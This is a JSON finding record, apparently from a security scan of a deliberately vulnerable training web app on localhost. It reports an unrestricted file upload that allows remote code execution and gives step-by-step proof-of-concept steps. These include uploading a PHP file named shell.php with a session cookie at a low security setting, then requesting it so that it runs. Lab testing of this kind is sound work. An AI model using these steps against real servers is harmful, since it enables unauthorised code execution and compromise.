      "title": "Unrestricted File Upload leads to Remote Code Execution",
      "location": "http://127.0.0.1:8080/vulnerabilities/upload/",
      "claim": "Attacker can upload arbitrary PHP files to the server and access them to execute code",
      "proof_excerpt": "<pre>../../hackable/uploads/shell.php succesfully uploaded!</pre>",
      "poc_hint": "1. Send POST to /vulnerabilities/upload/ with multipart form data: MAX_FILE_SIZE=100000, uploaded=@shell.php (file containing <?php phpinfo(); ?>), Upload=Upload. Use session cookie PHPSESSID=9kk32r8pdi340ch33to4hbg0s2; security=low. 2. Server responds with <pre>../../hackable/uploads/shell.php succesfully uploaded!</pre> 3. Access http://127.0.0.1:8080/hackable/uploads/shell.php - PHP executes, returns phpinfo() output confirming RCE."
